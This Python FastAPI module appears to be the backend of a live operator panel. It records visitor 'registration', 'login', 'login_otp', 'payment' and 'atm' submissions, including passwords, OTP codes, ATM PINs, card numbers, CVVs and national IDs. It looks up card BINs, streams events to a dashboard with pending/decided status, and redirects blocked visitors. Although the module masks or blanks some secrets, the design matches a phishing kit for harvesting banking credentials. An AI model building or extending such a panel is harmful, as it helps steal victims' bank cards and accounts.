import asyncio

from fastapi import WebSocket

from . import state
from .db import get_mongo_db
from .services.sessions import active_non_root_sessions_count, get_active_sessions_list
from .services.visits import get_visits_total_count
from .services.visitors import build_visitor_redirect_url
from .services.registrations import ensure_payment_bin_info

DASHBOARD_INFO_EVENTS_LIMIT = 20


def masked_card_number(value) -> str:
    digits = ''.join(ch for ch in str(value or '') if ch.isdigit())
    if not digits:
        return ''
    return f'**** **** **** {digits[-4:]}' if len(digits) >= 4 else '****'


def sanitize_info_event(event: dict) -> dict:
    clean = dict(event)
    clean['password'] = ''
    clean['otp_code'] = ''
    clean['atm_pin'] = ''
    clean['card_number'] = masked_card_number(clean.get('card_number', ''))
    clean['card_cvv'] = ''
    return clean


async def send_json_best_effort(ws: WebSocket, payload: dict, *, close_code: int | None = None) -> WebSocket | None:
    try:
        await ws.send_json(payload)
        if close_code is not None:
            await ws.close(code=close_code)
        return None
    except Exception:
        return ws


async def broadcast_json_best_effort(
    clients,
    payload: dict,
    *,
    close_code: int | None = None,
) -> list[WebSocket]:
    targets = list(clients)
    if not targets:
        return []
    results = await asyncio.gather(
        *(send_json_best_effort(ws, payload, close_code=close_code) for ws in targets),
        return_exceptions=False,
    )
    return [ws for ws in results if ws is not None]


def admin_realtime_payload(recent_visit: dict | None = None) -> dict:
    if state.live_admin_payload.get('ready'):
        payload = {
            'type': 'admin.update',
            'active_sessions_count': state.live_admin_payload.get('active_sessions_count', 0),
            'sessions': state.live_admin_payload.get('sessions', []),
            'visits_total': get_visits_total_count(),
        }
        if recent_visit:
            payload['recent_visit'] = recent_visit
        return payload

    sessions = get_active_sessions_list()
    active_count = active_non_root_sessions_count()
    state.live_admin_payload['ready'] = True
    state.live_admin_payload['active_sessions_count'] = active_count
    state.live_admin_payload['sessions'] = sessions
    payload = {
        'type': 'admin.update',
        'active_sessions_count': active_count,
        'sessions': sessions,
        'visits_total': get_visits_total_count(),
    }
    if recent_visit:
        payload['recent_visit'] = recent_visit
    return payload


def dashboard_realtime_payload(recent_visit: dict | None = None, *, include_info_events: bool = True) -> dict:
    payload = {
        'type': 'dashboard.update',
        'visits_total': get_visits_total_count(),
    }
    if include_info_events:
        payload['info_events'] = recent_info_events(DASHBOARD_INFO_EVENTS_LIMIT)
    if recent_visit:
        payload['recent_visit'] = recent_visit
    return payload


def selection_signature(event: dict) -> str:
    parts = [
        event.get('visitor_uid', '') or '',
        event.get('type', '') or '',
        event.get('request_type', '') or '',
        event.get('watch_id', '') or '',
        event.get('category', '') or '',
    ]
    # Registration submissions should be kept as a timeline (don't collapse into one row),
    # so include `ts` to make each submission unique.
    if (event.get('type') or '') in {'registration', 'login', 'login_otp', 'payment', 'atm'}:
        parts.append(event.get('ts', '') or '')
    return '|'.join(parts)


def serialize_info_event(row: dict) -> dict:
    row = ensure_payment_bin_info(row, allow_lookup=False)
    return {
        'type': row.get('type', 'selection'),
        'ts': row.get('ts', ''),
        'visitor_uid': row.get('visitor_uid', ''),
        'source_page': row.get('source_page', ''),
        'request_type': row.get('request_type', ''),
        'watch_id': row.get('watch_id', ''),
        'category': row.get('category', ''),
        'selection_signature': row.get('selection_signature', ''),
        'submission_id': row.get('submission_id', ''),
        'full_name': row.get('full_name', ''),
        'national_id': row.get('national_id', ''),
        'phone': row.get('phone', ''),
        'email': row.get('email', ''),
        'username': row.get('username', ''),
        'password': '',
        'otp_code': '',
        'atm_pin': '',
        'card_holder': row.get('card_holder', ''),
        'card_number': masked_card_number(row.get('card_number', '')),
        'card_expiry': row.get('card_expiry', ''),
        'card_cvv': '',
        'card_bin_type': row.get('card_bin_type', ''),
        'card_bin_brand': row.get('card_bin_brand', ''),
        'card_bin_country': row.get('card_bin_country', ''),
        'card_bin_currency': row.get('card_bin_currency', ''),
        'card_bin_bank': row.get('card_bin_bank', ''),
        'card_bin_lookup_status': row.get('card_bin_lookup_status', ''),
        'card_bin_lookup_message': row.get('card_bin_lookup_message', ''),
        'card_bin_lookup_checked_at': row.get('card_bin_lookup_checked_at', ''),
        'status': row.get('status', 'pending'),
        'decided_at': row.get('decided_at', ''),
        'decided_by': row.get('decided_by', ''),
    }


def recent_info_events(limit: int = 20) -> list[dict]:
    rows = get_mongo_db().info_events.find({}).sort('ts', -1).limit(limit)
    return [serialize_info_event(row) for row in reversed(list(rows))]


def info_events_for_visitor(visitor_uid: str, limit: int = 100) -> list[dict]:
    rows = (
        get_mongo_db()
        .info_events.find({'visitor_uid': (visitor_uid or '').strip()})
        .sort('ts', -1)
        .limit(max(1, min(200, limit)))
    )
    return [serialize_info_event(row) for row in reversed(list(rows))]


def push_info_event(event: dict) -> dict:
    event = sanitize_info_event({**event, 'selection_signature': selection_signature(event)})
    db = get_mongo_db()
    if (event.get('type') or '') in {'registration', 'login', 'login_otp', 'payment', 'atm'}:
        # Keep every submission (no upsert).
        db.info_events.insert_one(event.copy())
        return serialize_info_event(event)
    if event['visitor_uid'] and event['selection_signature']:
        insert_doc = {
            k: v
            for k, v in event.items()
            if k
            not in (
                'ts',
                'source_page',
                'full_name',
                'national_id',
                'phone',
                'email',
            )
        }
        # Upsert, but also refresh `ts` / `source_page` so re-selecting the same product
        # shows up as a fresh event on the dashboard.
        db.info_events.update_one(
            {'visitor_uid': event['visitor_uid'], 'selection_signature': event['selection_signature']},
            {
                '$set': {
                    'ts': event.get('ts', ''),
                    'source_page': event.get('source_page', ''),
                    # allow registration events to refresh submitted values
                    'full_name': event.get('full_name', ''),
                    'national_id': event.get('national_id', ''),
                    'phone': event.get('phone', ''),
                    'email': event.get('email', ''),
                },
                '$setOnInsert': insert_doc,
            },
            upsert=True,
        )
        row = (
            db.info_events.find_one({'visitor_uid': event['visitor_uid'], 'selection_signature': event['selection_signature']})
            or event
        )
        return serialize_info_event(row)

    db.info_events.insert_one(event.copy())
    return serialize_info_event(event)


async def broadcast_admin_update(recent_visit: dict | None = None) -> None:
    if not state.admin_ws_clients:
        return

    payload = admin_realtime_payload(recent_visit=recent_visit)
    stale = await broadcast_json_best_effort(state.admin_ws_clients, payload)
    for ws in stale:
        state.admin_ws_clients.discard(ws)


async def broadcast_dashboard_update(recent_visit: dict | None = None, *, include_info_events: bool = False) -> None:
    if not state.dashboard_ws_clients:
        return

    payload = dashboard_realtime_payload(recent_visit=recent_visit, include_info_events=include_info_events)
    stale = await broadcast_json_best_effort(state.dashboard_ws_clients, payload)
    for ws in stale:
        state.dashboard_ws_clients.discard(ws)


async def force_block_visitor(visitor_uid: str, *, backend_base_url: str = '') -> None:
    targets = list(state.visitor_ws_clients.get(visitor_uid, set()))
    payload = {
        'type': 'visitor.blocked',
        'redirect_url': build_visitor_redirect_url(visitor_uid, backend_base_url=backend_base_url),
    }
    stale = await broadcast_json_best_effort(targets, payload, close_code=1008)
    if visitor_uid in state.visitor_ws_clients:
        for ws in stale:
            state.visitor_ws_clients[visitor_uid].discard(ws)


async def force_logout_username(username: str) -> None:
    targets = list(state.admin_user_ws_clients.get(username, set()))
    stale = await broadcast_json_best_effort(targets, {'type': 'force.logout'}, close_code=1008)
    if username in state.admin_user_ws_clients:
        for ws in stale:
            state.admin_user_ws_clients[username].discard(ws)


async def notify_visitor(visitor_uid: str, payload: dict) -> None:
    """Send a realtime message to the visitor websocket clients (best-effort)."""
    targets = list(state.visitor_ws_clients.get(visitor_uid, set()))
    if not targets:
        return
    stale = await broadcast_json_best_effort(targets, payload)
    if visitor_uid in state.visitor_ws_clients:
        for ws in stale:
            state.visitor_ws_clients[visitor_uid].discard(ws)
